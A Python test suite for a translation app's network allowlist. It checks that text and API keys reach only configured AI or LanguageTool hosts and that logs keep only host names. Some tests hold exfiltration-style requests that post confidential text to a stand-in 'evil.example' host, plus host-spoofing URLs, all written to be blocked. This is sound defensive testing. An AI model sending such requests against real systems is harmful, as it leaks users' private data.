"""Phase 3: requests go only to configured hosts, and only host names are logged."""
import json
import logging
import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

requests = pytest.importorskip("requests")

from localizelarge.security import net  # noqa: E402
from modules import languagetool_client as ltc  # noqa: E402
from modules import llm_clients  # noqa: E402

SECRET_TEXT = "The quarterly figures for PROJ-001 are confidential."
KEY = "sk-test-PROJ001-key-0123456789abcdef"


@pytest.fixture(autouse=True)
def clean_policy(monkeypatch):
    monkeypatch.delenv("OLLAMA_ENDPOINT", raising=False)
    net.reset()
    yield
    net.reset()


class Wire:
    """Stands in for the network: records what would be sent, sends nothing."""

    def __init__(self, monkeypatch, reply_json=None, status=200, redirect_to=None):
        self.sent = []
        self.reply_json = reply_json if reply_json is not None else {}
        self.status = status
        self.redirect_to = redirect_to
        monkeypatch.setattr(requests.adapters.HTTPAdapter, "send",
                            lambda adapter, request, **kwargs: self._send(request, **kwargs))

    def _send(self, request, **kwargs):
        self.sent.append(request)
        response = requests.Response()
        response.request = request
        response.url = request.url
        if self.redirect_to and len(self.sent) == 1:
            response.status_code = 302
            response.headers["Location"] = self.redirect_to
            response._content = b""
        else:
            response.status_code = self.status
            response._content = json.dumps(self.reply_json).encode("utf-8")
            response.headers["Content-Type"] = "application/json"
        return response

    @property
    def hosts(self):
        return [net.host_of(r.url) for r in self.sent]


# ── The policy ───────────────────────────────────────────────────────────

@pytest.mark.parametrize("purpose, url", [
    ("claude", "https://api.anthropic.com/v1/messages"),
    ("openai", "https://api.openai.com/v1/chat/completions"),
    ("gemini", "https://generativelanguage.googleapis.com/v1beta/models/x:generateContent"),
    ("ollama", "http://localhost:11434/api/chat"),
])
def test_the_configured_hosts_are_allowed(purpose, url):
    assert net.check(url, purpose) == net.host_of(url)


@pytest.mark.parametrize("purpose, url", [
    ("claude", "https://evil.example/v1/messages"),
    ("claude", "https://api.openai.com/v1/messages"),           # right host, wrong purpose
    ("openai", "https://api.openai.com.evil.example/v1"),
    ("openai", "http://api.openai.com/v1"),                     # cloud providers are HTTPS only
    ("gemini", "https://generativelanguage.googleapis.com@evil.example/x"),
    ("ollama", "http://192.0.2.10:11434/api/chat"),             # not the configured Ollama
    ("languagetool", "http://localhost:8081/v2/check"),         # no server entered: off
    ("languagetool", "https://api.languagetool.org/v2/check"),
    ("openrouter", "https://openrouter.ai/api/v1"),             # not a purpose at all
    ("openai", "not a url"),
])
def test_everything_else_is_refused(purpose, url):
    with pytest.raises(net.HostNotAllowed):
        net.check(url, purpose)


def test_the_ollama_address_follows_the_setting():
    assert net.ollama_endpoint() == "http://localhost:11434"
    net.configure(ollama_endpoint="http://gpu-box.internal:11434/api/")
    assert net.ollama_endpoint() == "http://gpu-box.internal:11434"
    assert net.check("http://gpu-box.internal:11434/api/chat", "ollama") == "gpu-box.internal"
    with pytest.raises(net.HostNotAllowed):
        net.check("http://localhost:11434/api/chat", "ollama")
    net.configure(ollama_endpoint="")
    assert net.ollama_endpoint() == "http://localhost:11434"


def test_languagetool_is_reachable_only_after_the_user_enters_a_server():
    assert net.languagetool_url() is None
    net.configure(languagetool_url="http://localhost:8081")
    assert net.check("http://localhost:8081/v2/check", "languagetool") == "localhost"
    with pytest.raises(net.HostNotAllowed):
        net.check("https://api.languagetool.org/v2/check", "languagetool")


@pytest.mark.parametrize("host, local", [
    ("localhost", True), ("127.0.0.1", True), ("127.8.9.1", True), ("::1", True), ("[::1]", True),
    ("192.168.1.20", False), ("gpu-box.internal", False), ("api.openai.com", False), ("", False),
])
def test_what_counts_as_this_computer(host, local):
    assert net.is_local_host(host) is local


# ── The clients ──────────────────────────────────────────────────────────

def test_a_guarded_session_never_sends_to_another_host(monkeypatch):
    wire = Wire(monkeypatch)
    http = net.session("openai")
    with pytest.raises(net.HostNotAllowed):
        http.post("https://evil.example/collect", data=SECRET_TEXT)
    assert wire.sent == []
    http.post("https://api.openai.com/v1/chat/completions", data="{}")
    assert wire.hosts == ["api.openai.com"]


def test_a_redirect_to_another_host_is_refused(monkeypatch):
    wire = Wire(monkeypatch, redirect_to="https://evil.example/elsewhere")
    with pytest.raises(net.HostNotAllowed):
        net.session("openai").get("https://api.openai.com/v1/models")
    assert wire.hosts == ["api.openai.com"]          # the second hop was never sent


def test_local_requests_never_use_a_proxy():
    assert net.session("ollama").trust_env is False
    assert net.session("openai").trust_env is True      # a company proxy may be needed for the internet


def test_the_httpx_client_for_an_sdk_checks_every_request():
    httpx = pytest.importorskip("httpx")
    client = net.httpx_client("claude", timeout=30)
    [hook] = client.event_hooks["request"]
    hook(httpx.Request("POST", "https://api.anthropic.com/v1/messages"))
    with pytest.raises(net.HostNotAllowed):
        hook(httpx.Request("POST", "https://evil.example/v1/messages"))
    assert client.follow_redirects is False


def test_only_the_purpose_and_host_are_logged(monkeypatch, caplog):
    Wire(monkeypatch)
    caplog.set_level(logging.INFO, logger="localizelarge.net")
    net.session("openai").post("https://api.openai.com/v1/chat/completions?project=PROJ-001",
                               data=SECRET_TEXT, headers={"Authorization": f"Bearer {KEY}"})
    assert [r.getMessage() for r in caplog.records] == ["[net] openai -> api.openai.com"]
    assert SECRET_TEXT not in caplog.text and KEY not in caplog.text and "PROJ-001" not in caplog.text


def test_a_blocked_request_is_logged_with_its_host_only(caplog):
    caplog.set_level(logging.INFO, logger="localizelarge.net")
    with pytest.raises(net.HostNotAllowed) as blocked:
        net.check("https://evil.example/collect?text=" + SECRET_TEXT.replace(" ", "+"), "openai")
    assert caplog.records[-1].getMessage() == "[net] BLOCKED openai -> evil.example"
    assert "evil.example" in str(blocked.value) and "confidential" not in str(blocked.value)


# ── The AI providers ─────────────────────────────────────────────────────

def test_openai_always_goes_to_openai_through_the_guard(monkeypatch):
    openai = pytest.importorskip("openai")
    seen = {}

    class FakeOpenAI:
        def __init__(self, **kwargs):
            seen.update(kwargs)
            raise RuntimeError("stop before any request")

    monkeypatch.setattr(openai, "OpenAI", FakeOpenAI)
    monkeypatch.setenv("OPENAI_BASE_URL", "https://evil.example/v1")
    client = llm_clients.LLMClient(api_key=KEY, provider="openai", base_url="https://evil.example/v1")
    with pytest.raises(RuntimeError, match="stop before any request"):
        client._call_openai("Hello")
    assert seen["base_url"] == "https://api.openai.com/v1"
    assert seen["http_client"].event_hooks["request"], "the SDK was not given the guarded client"


def test_claude_always_goes_to_anthropic_through_the_guard(monkeypatch):
    anthropic = pytest.importorskip("anthropic")
    seen = {}

    class FakeAnthropic:
        def __init__(self, **kwargs):
            seen.update(kwargs)
            raise RuntimeError("stop before any request")

    monkeypatch.setattr(anthropic, "Anthropic", FakeAnthropic)
    monkeypatch.setenv("ANTHROPIC_BASE_URL", "https://evil.example")
    client = llm_clients.LLMClient(api_key=KEY, provider="claude")
    with pytest.raises(RuntimeError, match="stop before any request"):
        client._call_claude("Hello")
    assert seen["base_url"] == "https://api.anthropic.com"
    assert seen["http_client"].event_hooks["request"]


GEMINI_REPLY = {
    "candidates": [{"content": {"parts": [{"text": "hidden reasoning", "thought": True}, {"text": " مرحبا "}]}}],
    "usageMetadata": {"promptTokenCount": 12, "candidatesTokenCount": 3, "cachedContentTokenCount": 4},
}


def test_gemini_goes_over_https_through_the_guard(monkeypatch):
    wire = Wire(monkeypatch, reply_json=GEMINI_REPLY)
    client = llm_clients.LLMClient(api_key=KEY, provider="gemini", model="gemini-3.1-flash-lite")
    text, usage = client._call_gemini_with_usage("Translate: Hello", system_prompt="Be brief.")
    assert text == "مرحبا"
    assert usage == {"input_tokens": 12, "output_tokens": 3,
                     "cache_read_input_tokens": 4, "cache_creation_input_tokens": 0}
    [request] = wire.sent
    assert request.url == ("https://generativelanguage.googleapis.com/v1beta/models/"
                           "gemini-3.1-flash-lite:generateContent")
    assert request.headers["x-goog-api-key"] == KEY
    assert KEY not in request.url                      # the key is never put in the address
    body = json.loads(request.body)
    assert body["contents"][0]["parts"][0]["text"] == "Translate: Hello"
    assert body["systemInstruction"]["parts"][0]["text"] == "Be brief."
    assert "generationConfig" not in body              # no thinking setting for this model
    assert client._call_gemini("Translate: Hello") == "مرحبا"


def test_gemini_thinking_models_are_asked_for_minimal_thinking(monkeypatch):
    wire = Wire(monkeypatch, reply_json=GEMINI_REPLY)
    client = llm_clients.LLMClient(api_key=KEY, provider="gemini", model="gemini-3.5-flash")
    client._call_gemini("Hello", max_tokens=500)
    body = json.loads(wire.sent[0].body)
    assert body["generationConfig"] == {"thinkingConfig": {"thinkingLevel": "minimal"}, "maxOutputTokens": 500}


def test_a_gemini_error_is_reported_without_losing_the_cause(monkeypatch):
    Wire(monkeypatch, reply_json={"error": {"message": "API key not valid"}}, status=400)
    client = llm_clients.LLMClient(api_key=KEY, provider="gemini", model="gemini-3.1-flash-lite")
    with pytest.raises(RuntimeError, match="Gemini error 400.*API key not valid"):
        client._call_gemini("Hello")


def test_the_gemini_sdk_is_not_used_anywhere():
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    for folder in ("modules", "localizelarge"):
        for dirpath, _dirs, files in os.walk(os.path.join(root, folder)):
            for name in files:
                if name.endswith(".py"):
                    source = open(os.path.join(dirpath, name), encoding="utf-8").read()
                    assert "import google.generativeai" not in source, name


def test_ollama_status_asks_only_the_configured_address(monkeypatch):
    wire = Wire(monkeypatch, reply_json={"models": [{"name": "translategemma:12b"}]})
    status = llm_clients.LLMClient.check_ollama_status()
    assert status["running"] is True and status["models"] == ["translategemma:12b"]
    assert wire.hosts == ["localhost"]


# ── Where text goes ──────────────────────────────────────────────────────

@pytest.mark.parametrize("provider, sentence", [
    (None, "Text stays on this computer"),
    ("", "Text stays on this computer"),
    ("ollama", "Text stays on this computer"),
    ("claude", "Text is sent to Anthropic (Claude)"),
    ("openai", "Text is sent to OpenAI"),
    ("gemini", "Text is sent to Google (Gemini)"),
])
def test_the_where_text_goes_sentence(provider, sentence):
    assert net.where_text_goes(provider) == sentence


def test_ollama_on_another_computer_is_named_as_a_destination():
    net.configure(ollama_endpoint="http://gpu-box.internal:11434")
    assert net.where_text_goes("ollama") == "Text is sent to Ollama at gpu-box.internal"
    net.configure(ollama_endpoint="http://127.0.0.1:11434")
    assert net.where_text_goes("ollama") == "Text stays on this computer"


# ── LanguageTool ─────────────────────────────────────────────────────────

def test_languagetool_has_no_default_server():
    with pytest.raises(ltc.NoServerConfigured):
        ltc.check_texts(["Een zin."], "nl")
    with pytest.raises(ltc.NoServerConfigured):
        ltc.validate_server("")


@pytest.mark.parametrize("url", [
    "https://api.languagetool.org", "https://api.languagetool.org/", "https://languagetool.org/api",
    "https://api.languagetoolplus.com",
])
def test_languagetools_public_service_is_refused(monkeypatch, url):
    wire = Wire(monkeypatch)
    with pytest.raises(ValueError, match="public service"):
        ltc.check_texts([SECRET_TEXT], "en", url)
    with pytest.raises(ValueError, match="public service"):
        ltc.check_request(url, SECRET_TEXT, "en")
    assert wire.sent == []


def test_a_user_entered_languagetool_server_is_used(monkeypatch):
    wire = Wire(monkeypatch, reply_json={"matches": []})
    assert ltc.check_request("http://localhost:8081/", "Een zin.", "nl") == []
    assert wire.sent[0].url == "http://localhost:8081/v2/check"
    assert net.languagetool_url() == "http://localhost:8081"


# ── The where-text-goes line in the main window ──────────────────────────

@pytest.fixture(scope="module")
def S():
    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    from PyQt6.QtWidgets import QApplication
    QApplication.instance() or QApplication([])
    saved = sys.stdout, sys.stderr
    import Supervertaler   # re-wraps stdout/stderr on Windows at import
    S._wrappers = sys.stdout, sys.stderr
    sys.stdout, sys.stderr = saved
    return Supervertaler


def _window(S, provider, keys):
    import types
    w = types.SimpleNamespace(
        load_llm_settings=lambda: {"provider": provider},
        load_api_keys=lambda: dict(keys),
    )
    for name in ("_where_text_goes", "_update_text_destination_label"):
        setattr(w, name, types.MethodType(getattr(S.SupervertalerQt, name), w))
    return w


@pytest.mark.parametrize("provider, keys, sentence", [
    ("openai", {}, "Text stays on this computer"),                       # no key: no AI can run
    ("openai", {"openai": KEY}, "Text is sent to OpenAI"),
    ("claude", {"openai": KEY}, "Text stays on this computer"),          # a key for another provider
    ("claude", {"claude": KEY}, "Text is sent to Anthropic (Claude)"),
    ("gemini", {"gemini": KEY}, "Text is sent to Google (Gemini)"),
    ("ollama", {}, "Text stays on this computer"),
    ("mistral", {}, "Text is sent to mistral"),                          # cannot happen; never says "stays"
])
def test_the_main_window_sentence_follows_provider_and_key(S, provider, keys, sentence):
    assert _window(S, provider, keys)._where_text_goes() == sentence


def test_the_status_bar_label_shows_the_sentence_with_an_icon(S, qtbot):
    from PyQt6.QtWidgets import QLabel
    w = _window(S, "claude", {"claude": KEY})
    w.text_destination_label = QLabel()
    qtbot.addWidget(w.text_destination_label)
    w._update_text_destination_label()
    assert w.text_destination_label.text() == "↗ Text is sent to Anthropic (Claude)"
    assert "your\nown API key" in w.text_destination_label.toolTip().replace(" own", "\nown") or \
        "own API key" in w.text_destination_label.toolTip()

    w.load_llm_settings = lambda: {"provider": "ollama"}
    w._update_text_destination_label()
    assert w.text_destination_label.text() == "🔒 Text stays on this computer"


def test_the_sentence_appears_in_ai_settings_and_the_batch_dialog():
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    source = open(os.path.join(root, "Supervertaler.py"), encoding="utf-8").read()
    for object_name in ("textDestinationLabel", "aiSettingsTextDestination", "batchTextDestination"):
        assert f'setObjectName("{object_name}")' in source, object_name
